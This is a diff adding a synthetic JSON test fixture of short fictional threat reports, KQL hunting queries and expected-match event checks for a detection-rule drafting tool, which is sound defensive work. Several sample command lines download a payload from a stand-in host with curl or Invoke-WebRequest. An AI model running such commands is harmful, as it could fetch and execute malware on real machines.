@@ -1,0 +1,328 @@
+{
+  "synthetic": true,
+  "notice": "All text and events are fictional; URLs are never fetched remotely. No client predicates or analyst annotations are supplied to the draft writer.",
+  "expected_drafts": 11,
+  "expected_checks": 23,
+  "reports": [
+    {
+      "name": "rmm",
+      "sections": [
+        {
+          "tag": "p",
+          "text": "RMM.Agent.exe launched PowerShell with Invoke-WebRequest, then executed msiexec.exe with /qn to install the package."
+        }
+      ],
+      "expected_drafts": 1,
+      "checks": [
+        {
+          "name": "rmm positive",
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "C:\\Tools\\RMM.Agent.exe",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell Invoke-WebRequest https://example.test/package"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "rmm negative",
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "explorer.exe",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell Invoke-WebRequest https://example.test/package"
+          },
+          "expected_match": false
+        }
+      ]
+    },
+    {
+      "name": "sideload",
+      "sections": [
+        {
+          "tag": "p",
+          "text": "The malicious loader GatherOsState.exe sideloads slc.dll, the backdoor."
+        }
+      ],
+      "expected_drafts": 1,
+      "checks": [
+        {
+          "name": "sideload positive",
+          "event": {
+            "event_type": "image_load",
+            "Image": "GatherOsState.exe",
+            "ImageLoaded": "C:\\Users\\Public\\slc.dll"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "sideload negative",
+          "event": {
+            "event_type": "image_load",
+            "Image": "GatherOsState.exe",
+            "ImageLoaded": "C:\\Windows\\System32\\slc.dll"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "System32 prefix boundary",
+          "event": {
+            "event_type": "image_load",
+            "Image": "GatherOsState.exe",
+            "ImageLoaded": "C:\\Windows\\System32evil\\slc.dll"
+          },
+          "expected_match": true
+        }
+      ]
+    },
+    {
+      "name": "linux",
+      "sections": [
+        {
+          "tag": "p",
+          "text": "The attacker used nginx to launch bash with curl to download the malicious payload on Linux."
+        }
+      ],
+      "expected_drafts": 1,
+      "checks": [
+        {
+          "name": "linux positive",
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "/usr/sbin/nginx",
+            "Image": "/bin/bash",
+            "CommandLine": "bash -c curl https://example.test/payload"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "linux negative",
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "/usr/sbin/nginx",
+            "Image": "/bin/bash",
+            "CommandLine": "bash -c echo hello"
+          },
+          "expected_match": false
+        }
+      ]
+    },
+    {
+      "name": "mshta",
+      "sections": [
+        {
+          "tag": "p",
+          "text": "The attacker used mshta.exe to launch GatherOsState.exe during the intrusion."
+        }
+      ],
+      "expected_drafts": 1,
+      "checks": [
+        {
+          "name": "mshta positive",
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "mshta.exe",
+            "Image": "GatherOsState.exe",
+            "CommandLine": "GatherOsState.exe"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "mshta negative",
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "explorer.exe",
+            "Image": "GatherOsState.exe",
+            "CommandLine": "GatherOsState.exe"
+          },
+          "expected_match": false
+        }
+      ]
+    },
+    {
+      "name": "queries",
+      "sections": [
+        {
+          "tag": "p",
+          "text": "This fictional technical report supplies hunting queries for investigation. Query matches are hypotheses, and authorized administrative activity can also match; all sources and event examples here are synthetic."
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName == \"conhost.exe\" and ProcessCommandLine contains \"exact\""
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName =~ \"mshta.exe\" and ProcessCommandLine contains \"insensitive\""
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName =~ \"conhost.exe\" | where ProcessCommandLine has \"curl\""
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName =~ \"powershell.exe\" and ProcessCommandLine contains \"substring\""
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName endswith \"cmd.exe\" and ProcessCommandLine contains \"suffix\""
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName =~ \"rundll32.exe\" and ProcessCommandLine has_any (\"choice\", \"alternate\")"
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName =~ \"msiexec.exe\" and ProcessCommandLine has_all (\"both\", \"quiet\")"
+        },
+        {
+          "tag": "pre",
+          "text": "DeviceProcessEvents | where FileName =~ \"unsupported.exe\" | summarize count()"
+        }
+      ],
+      "expected_drafts": 7,
+      "checks": [
+        {
+          "name": "exact positive",
+          "query_literal": "exact",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "conhost.exe",
+            "CommandLine": "exact"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "exact negative",
+          "query_literal": "exact",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "Conhost.exe",
+            "CommandLine": "exact"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "insensitive positive",
+          "query_literal": "insensitive",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "MSHTA.EXE",
+            "CommandLine": "insensitive"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "insensitive negative",
+          "query_literal": "insensitive",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "explorer.exe",
+            "CommandLine": "insensitive"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "curl positive",
+          "query_literal": "curl",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "conhost.exe",
+            "CommandLine": "curl https://example.test"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "curl negative",
+          "query_literal": "curl",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "conhost.exe",
+            "CommandLine": "curling https://example.test"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "substring positive",
+          "query_literal": "substring",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "powershell.exe",
+            "CommandLine": "prefixsubstringpostfix"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "substring negative",
+          "query_literal": "substring",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "powershell.exe",
+            "CommandLine": "safe"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "suffix positive",
+          "query_literal": "suffix",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\cmd.exe",
+            "CommandLine": "suffix"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "suffix negative",
+          "query_literal": "suffix",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\cmd.exe.bak",
+            "CommandLine": "suffix"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "choice positive",
+          "query_literal": "choice",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "rundll32.exe",
+            "CommandLine": "alternate"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "choice negative",
+          "query_literal": "choice",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "rundll32.exe",
+            "CommandLine": "choiceword"
+          },
+          "expected_match": false
+        },
+        {
+          "name": "both positive",
+          "query_literal": "both",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "msiexec.exe",
+            "CommandLine": "both quiet"
+          },
+          "expected_match": true
+        },
+        {
+          "name": "both negative",
+          "query_literal": "both",
+          "event": {
+            "event_type": "process_creation",
+            "Image": "msiexec.exe",
+            "CommandLine": "both"
+          },
+          "expected_match": false
+        }
+      ],
+      "unsupported_query": true
+    }
+  ]
+}
